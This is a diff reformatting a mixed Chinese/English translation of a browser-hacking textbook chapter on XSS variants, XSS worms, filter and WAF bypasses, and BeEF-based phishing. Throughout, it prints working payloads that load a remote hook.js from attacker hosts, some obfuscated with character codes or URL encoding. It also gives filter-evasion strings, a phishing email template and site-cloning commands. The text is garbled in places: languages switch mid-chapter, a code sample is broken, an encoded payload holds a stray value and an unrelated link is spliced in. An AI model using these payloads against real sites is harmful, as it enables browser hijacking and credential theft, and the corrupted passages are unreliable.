@@ -1,47 +1,15 @@
-# 
+
 The Browser Hacker's Handbook 翻译为 “The 浏览器黑客手册”
 
-
-start graphic ![cover](img/cover.png) end graphic 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+![cover](img/cover.png)
 
 Questions
 
+- Proxying through the Browser
+- Launching Denial-of-Service Attacks
+- Launching Web Application Exploits
 
-
-Proxying through the Browser
-
-Launching Denial-of-Service Attacks
-
-Launching Web Application Exploits
-
-
-
-
-
-
- start graphic ![titlepage](img/titlepage.png) end graphic 
+![titlepage](img/titlepage.png)
 
 A lot of responsibility is placed upon the broad shoulders of the humble web browser. The web browser is designed to request instructions from all over the Internet, and these instructions are then executed almost without question. The browser must faithfully assemble the remotely retrieved content into a standardized digestible form and support the rich feature set available in today’s Web 2.0.
 
@@ -50,7 +18,6 @@ Remember, this is the same software with which you conduct your important affair
 The development team of this “all singing and all dancing” software has to ensure that each of its numerous nooks and crannies don’t provide an avenue for a hacker. Whether or not you consciously know it, every time you use a browser, you are trusting a team of people you have probably never met (and likely never will) to protect your important information from the attackers on the Internet.
 
 This chapter introduces a methodology for web browser hacking that can be employed for offensive engagements. You explore the web browser’s role in the web ecosystem, including delving into the interplay between it and the web server. You also examine some browser security fundamentals that will provide a bedrock for the remaining chapters of this book.
-
 
 每个软件变体都有记录的漏洞历史。
 
@@ -85,33 +52,40 @@ Web 采用了在 1970 年代开发的广泛网络方法——客户端-服务器
 进一步研究 Web 应用漏洞强烈推荐。对初学者和经验丰富的安全专业人员而言，Web Application Hacker’s Handbook（Dafydd Stuttard 和 Marcus Pinto 著，Wiley，2011 年出版），当时正处于第二版。
 
 ## 同源策略
+
+```
 <%
+
  Statement statement = connection.createStatement();
+
  ResultSet result = 
+
   statement.executeQuery("SELECT * FROM users LIMIT 10");
+
 %>
+
 最近注册的前 10 位用户如下:<br />
+
 <% while(result.next()) { %>
+
   用户：<%=result.getString("userDisplayName")%c<%
+
  } %>
+```
 
-利用此漏洞（例如通过访问 http://browservictim.com/newuser.jsp?userdisplayname=<script%20src=http://browserhacker.com/hook.js></script>）现在，作为攻击者，你拥有了“力量倍增”。不再需要诱骗单个用户访问携带 XSS 载荷的网站，只需攻击一个网站，随后的所有访客都会执行恶意 JavaScript。
-
-start feature 
-
-* * *
+利用此漏洞（例如通过访问 `http://browservictim.com/newuser.jsp?userdisplayname=<script%20src=http://browserhacker.com/hook.js></script>`）现在，作为攻击者，你拥有了“力量倍增”。不再需要诱骗单个用户访问携带 XSS 载荷的网站，只需攻击一个网站，随后的所有访客都会执行恶意 JavaScript。
 
 **真实世界中的持久 XSS** 持久 XSS 的著名真实案例包括：
 
-*   Ben Hayak 的 “Google Mail Hacking - Gmail Stored XSS – 2012!” ([`benhayak.blogspot.co.uk/2012/06/google-mail-hacking-gmail-stored-xss.html`](http://benhayak.blogspot.co.uk/2012/06/google-mail-hacking-gmail-stored-xss.html))
+- Ben Hayak 的 “Google Mail Hacking - Gmail Stored XSS – 2012!” ([`benhayak.blogspot.co.uk/2012/06/google-mail-hacking-gmail-stored-xss.html`](http://benhayak.blogspot.co.uk/2012/06/google-mail-hacking-gmail-stored-xss.html))
 
-Level1 Hayak 发现了 Gmail 中的一个持久 XSS 漏洞。该漏洞出现在 Google 为 Gmail 新增的一个功能中，用于显示 Google+ 好友的信息。如果在 Google+ 个人资料的某个组件中加入恶意 JavaScript（满足特定条件），你的 Gmail 好友会执行你的代码。/Level1
+  Level1 Hayak 发现了 Gmail 中的一个持久 XSS 漏洞。该漏洞出现在 Google 为 Gmail 新增的一个功能中，用于显示 Google+ 好友的信息。如果在 Google+ 个人资料的某个组件中加入恶意 JavaScript（满足特定条件），你的 Gmail 好友会执行你的代码。/Level1
 
-*   XSSed 的 “Another eBay permanent XSS” ([`www.xssed.com/news/131/Another_Ebay_permanent_XSS/`](http://www.xssed.com/news/131/Another_Ebay_permanent_XSS/))
+- XSSed 的 “Another eBay permanent XSS” ([`www.xssed.com/news/131/Another_Ebay_permanent_XSS/`](http://www.xssed.com/news/131/Another_Ebay_permanent_XSS/))
 
-Level1 eBay 并未免于 web 漏洞的困扰。安全研究员 Shubham Upadhyay 发现可以在 eBay 上创建一个新列表，并包含额外的 JavaScript 载荷。这意味着任何不慎访问该列表的用户都会在 https://ebay.com 的域内执行该持久 XSS。
+  Level1 eBay 并未免于 web 漏洞的困扰。安全研究员 Shubham Upadhyay 发现可以在 eBay 上创建一个新列表，并包含额外的 JavaScript 载荷。这意味着任何不慎访问该列表的用户都会在 `https://ebay.com` 的域内执行该持久 XSS。
 
-* * *
+---
 
 ### DOM 跨站脚本 (DOM XSS)
 
@@ -125,11 +99,11 @@ document.write(document.location.href.substr(
     /#welcomemessage/i)+16,document.location.href.length))
 ```
 
-这段代码会从 URL 中 `#welcomemessage=` 之后的所有字符提取出来，并写入当前页面的文档。例如，假设 URL 为 http://browservictim.com/homepage.html#welcomemessage=Hiya，页面加载时会把 “Hiya” 插入到文档体中。
+这段代码会从 URL 中 `#welcomemessage=` 之后的所有字符提取出来，并写入当前页面的文档。例如，假设 URL 为 `http://browservictim.com/homepage.html#welcomemessage=Hiya`，页面加载时会把 “Hiya” 插入到文档体中。
 
-如果在同一 URL 中加入恶意代码，例如 http://browservictim.com/homepage.html#welcomemessage=<script>document.location='http://browserhacker.com'</script>，这段 JavaScript 会被写入 DOM，从而把浏览器重定向到 http://browserhacker.com。
+如果在同一 URL 中加入恶意代码，例如 `http://browservictim.com/homepage.html#welcomemessage=<script>document.location='http://browserhacker.com'</script>`，这段 JavaScript 会被写入 DOM，从而把浏览器重定向到 `http://browserhacker.com`。
 
-由于其客户端特性，DOM XSS 攻击往往对服务器不可见，使用片段标识符（# 之后的内容）可以在 URL 中加入数据，这些数据通常不会被发送到 Web 应用服务器。
+由于其客户端特性，DOM XSS 攻击往往对服务器不可见，使用片段标识符（`#` 之后的内容）可以在 URL 中加入数据，这些数据通常不会被发送到 Web 应用服务器。
 
 当攻击字符串位于 `#` 之后的数据时，恶意数据根本不会离开浏览器。这对依赖 Web 应用防火墙（WAF）的应用有影响——恶意请求部分可能根本不会被 WAF 看到。
 
@@ -149,46 +123,39 @@ eval('getId(' + id.toString() + ')');
 
 这段代码可以通过在 `id` 参数中注入恶意代码来利用。例如，尝试加载并执行远程 JavaScript 的 payload：
 
-http://browservictim.com/page.html?id=1');s=document.createElement('script');s.src='http://browserhacker.com/hook.js';document.getElementsByTagName('head')\[0\].appendChild(s);//.
+`http://browservictim.com/page.html?id=1');s=document.createElement('script');s.src='http://browserhacker.com/hook.js';document.getElementsByTagName('head')\[0\].appendChild(s);//.`
 
 由于前面的 `eval` 调用会在单引号结束前终止，这段 payload 无法执行。为了绕过此限制，可以使用 JavaScript 的 `String.fromCharCode()` 方法将字符串隐藏，生成如下 URL：
 
-[`browservictim.com/page.html?id=1'};eval(String.fromCharCode(115,61,100,111,99,117,109,101,116,46,99,114,101,97,116,101,6E,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,101,114,46,99,111,109,47,104,111,111,107,46,106,115,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))//`](http://browservictim.com/page.html?id=1'};eval\(String.fromCharCode\(115,61,100,111,99,117,109,101,116,46,99,114,101,97,116,101,6E,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,101,114,46,99,111,109,47,104,111,111,107,46,106,115,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59\)\)//)
-
-
-
+[`browservictim.com/page.html?id=1'};eval(String.fromCharCode(115,61,100,111,99,117,109,101,116,46,99,114,101,97,116,101,6E,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,101,114,46,99,111,109,47,104,111,111,107,46,106,115,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))//`](http://browservictim.com/page.html?id=1'};eval\(String.fromCharCode\(115,61,100,111,99,117,109,101,116,46,99,114,101,97,116,101,6E,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,114,111,119,115,101,114,104,97,99,107,101,114,46,99,111,109,47,104,111,111,107,46,106,115,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))//)
 
 The preceding example highlights an interesting issue with exploiting these types of XSS flaws. The exploit first has to be delivered to your unsuspecting target without alerting suspicion. In the previous examples, a user can be tricked into visiting the malicious URL through any number of means, including an e‑mail, a social networking status update or an instant message.
 
-Often these URLs are wrapped up by a URL‑shortening service such as `http://bit.ly` or `http://goo.gl` to obfuscate the true, malicious nature of the URL. You will delve into these methods of delivery later in this chapter in the Using Social Engineering Attacks section.
 
- start feature 
 
-* * *
-
-**Real-World DOM XSS** Some notable real-world examples of DOM‑based XSS include: 
-
-*   Stefano Di Paola’s “DOM XSS on Google Plus One Button” `http://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html`
-
-Level1 Stefano Di Paola discovered a Cross‑origin Resource sharing (CORS) flaw within the JavaScript of Google’s +1 button. This vulnerability would have allowed you to execute instructions within Google’s origin. /Level1 
-
-*   Shahin Ramezany’s “Yahoo Mail DOM‑XSS” (`http://abysssec.com/files/Yahoo!_DOMSDAY.pdf`)
-
-Level1 Unfortunately for Yahoo, one of its commonly used ad‑based subdomains was using an out‑of‑date JavaScript that exposed a DOM XSS flaw. This third‑party script had been updated to address an unprotected `eval()` function call, but at the time of the research, Yahoo was still using a vulnerable version. /Level1 
+Often these URLs are wrapped up by a URL-shortening service such as `http://bit.ly` or `http://goo.gl` to obfuscate the true, malicious nature of the URL. You will delve into these methods of delivery later in this chapter in the Using Social Engineering Attacks section.
 
 * * *
 
- end feature 
+**Real-World DOM XSS** Some notable real-world examples of DOM-based XSS include:
 
-### Universal Cross‑site Scripting
+* Stefano Di Paola’s “DOM XSS on Google Plus One Button” `http://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html`
 
-A client‑side XSS vulnerability, known as Universal XSS, is a different method of executing malicious JavaScript in a browser. In some instances, it isn’t even constrained by the SOP.
+Level1 `Stefano Di Paola` discovered a Cross-origin Resource sharing (`CORS`) flaw within the JavaScript of Google’s +1 button. This vulnerability would have allowed you to execute instructions within Google’s origin. /Level1
 
- start feature 
+* Shahin Ramezany’s “Yahoo Mail DOM-XSS” (`http://abysssec.com/files/Yahoo!_DOMSDAY.pdf`)
+
+Level1 Unfortunately for Yahoo, one of its commonly used ad-based subdomains was using an out-of-date JavaScript that exposed a DOM XSS flaw. This third-party script had been updated to address an unprotected `eval()` function call, but at the time of the research, Yahoo was still using a vulnerable version. /Level1
 
 * * *
 
-**Real-World Universal XSS** An interesting real‑world example of Universal XSS: Level1 In 2009, Roi Saltzman discovered how Internet Explorer was able to load arbitrary URIs with Chrome through the use of the ChromeHTML URL handler. 
+### Universal Cross-site Scripting
+
+A client-side XSS vulnerability, known as Universal XSS, is a different method of executing malicious JavaScript in a browser. In some instances, it isn’t even constrained by the SOP.
+
+* * *
+
+**Real-World Universal XSS** An interesting real-world example of Universal XSS: Level1 In 2009, Roi Saltzman discovered how Internet Explorer was able to load arbitrary URIs with Chrome through the use of the ChromeHTML URL handler.
 
 ```
 var sneaky = ‘setTimeout("alert(document.cookie);", 4000;
@@ -197,17 +164,15 @@ document.location =
   ‘chromehtml:"80%20javascript:document.write(sneaky)"’;
 ```
 
-This effectively allowed an attacker, given the right conditions, to execute any JavaScript they wanted against a target on almost any origin.5 For example, the preceding JavaScript would set the current location to a Chrome frame, with a timeout that would execute after Gmail had been loaded. /Level1 
+This effectively allowed an attacker, given the right conditions, to execute any JavaScript they wanted against a target on almost any origin.5 For example, the preceding JavaScript would set the current location to a Chrome frame, with a timeout that would execute after Gmail had been loaded. /Level1
 
 * * *
-
- end feature 
 
 This attack usually takes a step up the functionality chain and abuses flaws in either the browser itself, its extensions or its plugins. These vulnerabilities are explored in more detail in Chapter 7.
 
 ### XSS Viruses
 
-In 2005, research by Wade Alcorn6 demonstrated the potential of virus‑like distribution of malicious XSS code. This self‑propagation of code could occur if certain conditions between a vulnerable web application and browser were in place.
+In 2005, research by Wade Alcorn6 demonstrated the potential of virus-like distribution of malicious XSS code. This self-propagation of code could occur if certain conditions between a vulnerable web application and browser were in place.
 
 The research discussed a scenario whereby a Stored XSS vulnerability is exploited to cause subsequent visitors (to the infected origin) to execute malicious JavaScript. As a result, the target’s browser attempted to perform an XSS exploit against other web applications. The XSS payload used in the example was:
 
@@ -256,51 +221,46 @@ You can see in this code that the JavaScript executes `do_request()`, which send
 
 The implication for browsers due to this automatic proliferation of malicious JavaScript is fairly profound. In Alcorn’s demonstration, the execution does not rely on any user interaction, apart from visiting the page in the first place. The impacted user’s browser will simply execute the commands and carry on.
 
-The payload itself performed self‑propagation and then terminated. However, as you will learn in the following chapters, the number of malicious activities that can be performed from within a browser are countless.
+The payload itself performed self-propagation and then terminated. However, as you will learn in the following chapters, the number of malicious activities that can be performed from within a browser are countless.
 
 #### Samy
 
 It wasn’t long before Alcorn’s hypothetical attack became reality through Samy Kamkar and his infamous “Samy Worm” that impacted more than one million MySpace profiles. Many security professionals believe that the infection was the fastest spreading ever seen in the wild, with all those million profiles being impacted within the first 24 hours.
 
-It’s important to note that comparing traditional computer virus propagation to XSS virus propagation is not a black‑and‑white affair. This is especially the case because the infection doesn’t strictly leave conventional executables on a victim’s browser.
+It’s important to note that comparing traditional computer virus propagation to XSS virus propagation is not a black-and-white affair. This is especially the case because the infection doesn’t strictly leave conventional executables on a victim’s browser.
 
 The Samy Worm used a number of techniques to bypass MySpace’s preventative controls. At a high level, these included:
 
-*   Executing the initial JavaScript within a `div`’s `background:url` parameter, which was specific to IE versions 5 and 6:
+* Executing the initial JavaScript within a `div`’s `background:url` parameter, which was specific to IE versions 5 and 6:
 
-    ```
-    <div style="background:url('javascript:alert(1)')">
-    ```
+```
+<div style="background:url('javascript:alert(1)')">
+```
 
-*   Bypassing single‑quote and double‑quote escaping issues within JavaScript by positioning the code elsewhere and launching the instructions from a style attribute:
+* Bypassing single-quote and double-quote escaping issues within JavaScript by positioning the code elsewhere and launching the instructions from a style attribute:
 
-    ```
-    <div
-     id="mycode" expr="alert('hah!')"
-     style="background:url('javascript:eval(document.all.mycode.expr)')"
-    >
-    ```
+```
+<div
+ id="mycode" expr="alert('hah!')"
+ style="background:url('javascript:eval(document.all.mycode.expr)')"
+>
+```
 
-*   Bypassing the filtering of the word `javascript` by inserting a newline character (`\n`)
+* Bypassing the filtering of the word `javascript` by inserting a newline character (`\n`)
+* Inserting double quotes through the `String.fromCharCode()` method
+* Numerous other keyword blacklist bypasses through the use of the `eval()` method:
 
-*   Inserting double quotes through the `String.fromCharCode()` method
-
-*   Numerous other keyword blacklist bypasses through the use of the `eval()` method:
-
-    ```
-    eval('xmlhttp.onread' + 'ystatechange = callback');
-    ```
+```
+eval('xmlhttp.onread' + 'ystatechange = callback');
+```
 
 To review the full code and a walkthrough, check out: `http://namb.la/popular/tech.html`.
 
 #### Jikto
 
-In 2007, only a couple of years after the initial XSS propagation research, Hoffman demonstrated Jikto at ShmooCon. Jikto was a tool to demonstrate the impact of unmitigated XSS flaws, and what happens when you execute attacker‑controlled code within a browser.
+In 2007, only a couple of years after the initial XSS propagation research, Hoffman demonstrated Jikto at ShmooCon. Jikto was a tool to demonstrate the impact of unmitigated XSS flaws, and what happens when you execute attacker-controlled code within a browser.
 
-Advancing the methodology from earlier XSS self‑propagation research and code, Jikto was designed to kick off a silent JavaScript loop that would either try to self‑propagate, similar to Samy, or poll a central server for further commands. Although the code was constructed as an in‑house demonstration, it was leaked and slowly found its way onto the broader Internet.
-
-
-
+Advancing the methodology from earlier XSS self-propagation research and code, Jikto was designed to kick off a silent JavaScript loop that would either try to self-propagate, similar to Samy, or poll a central server for further commands. Although the code was constructed as an in-house demonstration, it was leaked and slowly found its way onto the broader Internet.
 
 一个在 Jikto 中更有趣的增强功能是它如何绕过 SOP。它通过将 Jikto 代码和目标源内容加载到同源（通过代理或跨域桥梁）来实现这一点。最初使用 Google Translate 来代理单独请求，但 Jikto 可以修改为使用其他站点作为代理。想要获取 Jikto 代码的拷贝，请访问 [`https://browserhacker.com`](https://browserhacker.com)。
 
@@ -323,6 +283,8 @@ Advancing the methodology from earlier XSS self‑propagation research and code,
 ```
 
 和
+
+
 
 ```
 <form>
@@ -349,7 +311,7 @@ DOM XSS 和通用 XSS 是后期加入的 XSS 类别的完美例子。与此同�
 
 除了可能出现的 JavaScript 执行问题外，现代浏览器中的 XSS 控制也是你面临的另一重大客户端障碍。这些防护措施旨在降低恶意 XSS 负载在目标浏览器中执行的可能性。防护措施包括 Chrome 和 Safari 的 XSS 审计器、Internet Explorer 的 XSS 过滤器以及 Firefox 的 NoScript 扩展。
 
-一种依赖浏览器优化对输入进行变异的 XSS 绕过技术被称为变异式跨站脚本（mXSS）。这种方法只有在浏览器对你精心构造的输入进行优化时才有效，即开发者使用 innerHTML 等方式解析你的输入。
+一种依赖浏览器优化对输入进行变异的 XSS 绕过技术被称为变异式跨站脚本（mXSS）。这种方法只有在浏览器对你精心构造的输入进行优化时才有效，即开发者使用 `innerHTML` 等方式解析你的输入。
 
 关键点是：你的输入无论如何都会被优化。下面的代码示例演示了 mXSS 的工作原理：
 
@@ -361,26 +323,26 @@ DOM XSS 和通用 XSS 是后期加入的 XSS 类别的完美例子。与此同�
 <IMG alt=``onload=xss() src="test.jpg"> 
 ```
 
-此示例突出了反引号（`）字符如何用于绕过 Internet Explorer 的 XSS 过滤器。浏览器的优化使得 onload 属性的值被执行。
+此示例突出了反引号（`）字符如何用于绕过 Internet Explorer 的 XSS 过滤器。浏览器的优化使得 `onload` 属性的值被执行。
 
 #### Bypassing Server XSS Defenses
 
 XSS 过滤并非仅限于客户端，事实上，服务器端的过滤自这些漏洞被发现以来一直是标准的应对措施。理想情况下，Web 应用的 XSS 防护既包括输入过滤也包括输出编码。
 
-一个绕过示例出现在 Microsoft 的 .NET 框架中。它提供了多种开发者可用的方法来降低恶意负载被服务器解析的可能性，包括 RequestValidator 类。早期的这些方法并不完全有效。例如，提交以下任一负载即可绕过过滤：
+一个绕过示例出现在 Microsoft 的 `.NET` 框架中。它提供了多种开发者可用的方法来降低恶意负载被服务器解析的可能性，包括 `RequestValidator` 类。早期的这些方法并不完全有效。例如，提交以下任一负载即可绕过过滤：
 
 ```
 <~/XSS/*-*/STYLE=xss:e/**/xpression(alert(6))>
 <%tag style="xss:expression(alert(6))">
 ```
 
-这两个示例都利用了 Microsoft 动态属性（Dynamic Properties）中的 expression() 功能。该功能用于在 CSS 中提供动态属性。
+这两个示例都利用了 Microsoft 动态属性（Dynamic Properties）中的 `expression()` 功能。该功能用于在 CSS 中提供动态属性。
 
 除了在源代码层面修复这些问题，安全供应商还快速提供了在脆弱应用之外的自动化修复方法，主要体现在 Web Application Firewall（WAF）或专门软件过滤器上，这些过滤器在应用层面执行相同的任务。无论技术组合如何，目标与客户端防护相同：降低攻击者利用 Web 安全漏洞的可能性。
 
 该技术如此有效，以至于所有攻击者都回家，WAF 技术被视为解决所有 Web 漏洞的万能药。当然，圣诞老人也是真实的！实际上，当面对挑战时，黑客们会挺身而出。9 正如绕过客户端控制一样，类似的负载和手段也被用于服务器端控制。
 
-WAF（及相关）技术常用的一种过滤技巧是检测出现上下文不符或可疑的括号。Gareth Heyes 2012 年的技术 10 是一个很好的绕过示例，它通过为 window DOM 对象附加错误处理器（不使用括号）并立即抛出异常来实现：
+WAF（及相关）技术常用的一种过滤技巧是检测出现上下文不符或可疑的括号。Gareth Heyes 2012 年的技术 10 是一个很好的绕过示例，它通过为 `window` DOM 对象附加错误处理器（不使用括号）并立即抛出异常来实现：
 
 ```
 onerror=alert;throw 1;
@@ -389,24 +351,17 @@ onerror=eval;throw'=alert\x281\x29';
 
 这两个示例中均不包含可疑的括号，但它们的注入点必须位于 HTML 元素的属性中。
 
- start feature 
-
 * * *
 
 **XSS Cheat Sheets** 是的，我们承认，如果你不是开发人员或 JavaScript 黑客，上面的示例可能让你感到困惑，双手抓起刚从头发上拔掉的头发！别担心。在许多情况下，期望攻击者或测试人员记住所有绕过 XSS 过滤的可能方法是不合理的。其中最早且最著名的 XSS 速查表是 Robert Hansen（RSnake）的 XSS Cheat Sheet，已捐赠给 OWASP 并可在 [`https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet`](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) 找到。随着 HTML5 的新特性不断引入，新的可利用的浏览器特性和属性也随之发现。Mario Heiderich 发布了 HTML5 安全速查表，可在 [`http://html5sec.org/`](http://html5sec.org/) 查看。除了这些速查表外，还有无数种组合方式可以将这些负载进行编码、组合和混合。帮助你完成这些操作的方法包括：
 
+-   `[Burp Suite]`的解码功能
 
+-   `[Gareth Hayes]`的 Hackvertor：[`hackvertor.co.uk/public`](https://hackvertor.co.uk/public)
 
-
--   [Burp Suite]的解码功能
-
--   [Gareth Hayes]的 Hackvertor：[`hackvertor.co.uk/public`](https://hackvertor.co.uk/public)
-
--   [Mario Heiderich]的字符编码器：[`yehg.net/encoding/`](http://yehg.net/encoding/)
+-   `[Mario Heiderich]`的字符编码器：[`yehg.net/encoding/`](http://yehg.net/encoding/)
 
 * * *
-
-end feature 
 
 ## 使用受损的 Web 应用程序
 
@@ -453,8 +408,6 @@ if (document.location.host.indexOf("browservictim.com") >= 0)
 
 * * *
 
-end feature 
-
 Leveraging phishing techniques to establish a beachhead on a target organization’s network works in much the same way as the scammers’ mode of operation. However, instead of trying to just acquire credentials or other information, you will attempt to inject your instructions into the target’s browser.
 
 The following sections discuss a few common methods in detail. They demonstrate how to use these attacks with the ultimate aim of coercing a target’s browser into executing your payloads.
@@ -471,20 +424,13 @@ As we have discussed, phishing attacks are one method traditionally executed by 
 
 * Whaling—A term coined for spear phishing that is targeting high profile or senior executives.
 
- start figure 
-
 **Figure 2-1:** Phishing e-mail example12
 
 ![c02f001.tif](img/c02f001.png)
 
- end figure 
-
 In the context of targeting browsers, your primary goal is to execute your code within the target browser. Therefore, pure e-mail phishing and other non-browser forms of social engineering won’t be discussed.
 
 #### Phase 1: The Website
-
-
-
 
 -   [构建假网站](https://wiki.example.org/feynmans_learning_method)是网络钓鱼攻击的第一阶段，其中包含恶意代码。根据网络钓鱼活动的范围，假网站可能是完全虚构的，也可能冒充合法网站。例如，如果你的目标是一家能源公司，你可能不想构建一个假的在线银行门户网站。相反，你可以创建一套符合能源行业兴趣的自定义网站，比如一个假的能源监管机构。
 
@@ -508,90 +454,93 @@ In the context of targeting browsers, your primary goal is to execute your code 
 
     I’ve been browsing your website and I’ve noticed a weird error message when I perform a search. After I click the ‘Search’ button I end up on this page: 
 
-    [[`browservictim.com/search.aspx?q=%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%73%65%72%76%65%72%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e`](http://browservictim.com/search.aspx?q=%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%73%65%72%76%65%72%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e)](http://browservictim.com/search.aspx?q=%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%73%65%72%76%65%72%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e)
 
-    I’m unsure if this is something wrong with my computer or if you guys are having an issue?
 
-    Kind Regards,
+[`browservictim.com/search.aspx?q=%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%73%65%72%76%65%72%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e`](http://browservictim.com/search.aspx?q=%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%73%65%72%76%65%72%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e)
 
-    Joe Bloggs”
+I’m unsure if this is something wrong with my computer or if you guys are having an issue?
 
--   这个 URL-encoded 查询参数实际上是：
+Kind Regards,
 
-    ```
-    <script src='http://browserhacker.com/hook.js'></script>
-    ```
+Joe Bloggs”
 
--   **如何克隆网站** 你可以使用多种方法克隆网站。例如，你可以使用 wget 命令行工具本地克隆网站：
+### URL 解码
 
-    ```
-    wget -k -p -nH -N http://browservictim.com
-    ```
+这个 URL-encoded 查询参数实际上是：
 
-    这些参数的含义如下：
+```
+<script src='http://browserhacker.com/hook.js'></script>
+```
 
-    *   `-k`——将下载文件中的链接转换为指向本地复制文件的链接，而非依赖原始或在线内容。
+### 如何克隆网站
 
-    *   `-p`——下载所有必要的辅助文件（如图片、样式表），确保页面在本地无需在线连接即可显示。
+你可以使用多种方法克隆网站。例如，你可以使用 `wget` 命令行工具本地克隆网站：
 
-    *   `-nH`——禁止将文件下载到以主机名命名的预定义文件夹中。
+```
+wget -k -p -nH -N http://browservictim.com
+```
 
-    *   `-N`——启用时间戳，使本地文件的时间与源文件保持一致。
+这些参数的含义如下：
 
--   BeEF 包含社交工程扩展的网站克隆功能。框架默认会在克隆的网页内容中注入其 JavaScript 钩子。要利用此功能，运行 ./beef 启动 BeEF，然后在另一个终端通过以下命令与 BeEF 的 RESTful API 交互：
+* `-k`——将下载文件中的链接转换为指向本地复制文件的链接，而非依赖原始或在线内容。
+* `-p`——下载所有必要的辅助文件（如图片、样式表），确保页面在本地无需在线连接即可显示。
+* `-nH`——禁止将文件下载到以主机名命名的预定义文件夹中。
+* `-N`——启用时间戳，使本地文件的时间与源文件保持一致。
 
-    ```
-    curl -H “Content-Type: application/json; charset=UTF-8”
-     -d ‘{“url”:”<URL of site to clone>”,”mount”:”<where to mount>”}’
-     -X POST http://<BeEFURL>/api/seng/clone_page?token=<token>
-    ```
+`BeEF` 包含社交工程扩展的网站克隆功能。框架默认会在克隆的网页内容中注入其 JavaScript 钩子。要利用此功能，运行 `./beef` 启动 BeEF，然后在另一个终端通过以下命令与 BeEF 的 RESTful API 交互：
 
-    执行后，BeEF 控制台会报告：
+```
+curl -H “Content-Type: application/json; charset=UTF-8”
+ -d ‘{“url”:”<URL of site to clone>”,”mount”:”<where to mount>”}’
+ -X POST http://<BeEFURL>/api/seng/clone_page?token=<token>
+```
 
-    ```
-    [18:19:17][*] BeEF hook added :-D
-    ```
+执行后，BeEF 控制台会报告：
 
-    参见 Figure 2-2 查看 BeEF 控制台输出示例。克隆后的网站可通过访问 http://<BeEFURL>/<where to mount> 来访问。mount 点也可以是网站的根目录。你还可以通过更新 BeEF 克隆页面文件夹中的文件来定制克隆网站：
+```
+[18:19:17][*] BeEF hook added :-D
+```
 
-    ```
-    beef/extensions/social_engineering/web_cloner/cloned_pages/<dom>_mod
-    ```
+参见 Figure 2-2 查看 BeEF 控制台输出示例。克隆后的网站可通过访问 `http://<BeEFURL>/<where to mount>` 来访问。mount 点也可以是网站的根目录。你还可以通过更新 BeEF 克隆页面文件夹中的文件来定制克隆网站：
 
-    参见 Figure 2-2 查看 BeEF 成功克隆网站后的控制台输出示例。
+```
+beef/extensions/social_engineering/web_cloner/cloned_pages/<dom>_mod
+```
 
--   无论使用何种方法构建 HTML，最重要的目标是将钓鱼内容与你的启动代码一起注入。如果你使用 BeEF 的社交工程扩展，此过程会自动完成。对于其他情况，可能需要手动更新 HTML。通常只需在 `</body>` 标签之前插入一行代码：
+参见 Figure 2-2 查看 BeEF 成功克隆网站后的控制台输出示例。
 
-    ```
-    <script src=http://browserhacker.com/hook.js></script>
-    ```
+无论使用何种方法构建 HTML，最重要的目标是将钓鱼内容与你的启动代码一起注入。如果你使用 BeEF 的社交工程扩展，此过程会自动完成。对于其他情况，可能需要手动更新 HTML。通常只需在 `</body>` 标签之前插入一行代码：
 
--   当钓鱼内容需要通过 Internet 访问时，你需要考虑如何托管你的 Web 应用。近年来，在线虚拟机的成本稳步下降。Amazon 最小的计算单元每小时仅收费 US$0.02（2013 年价格，不含数据存储和传输费用）。如果你运行一个持续 40 小时的攻击，费用不到 1 美元。
+```
+<script src=http://browserhacker.com/hook.js></script>
+```
 
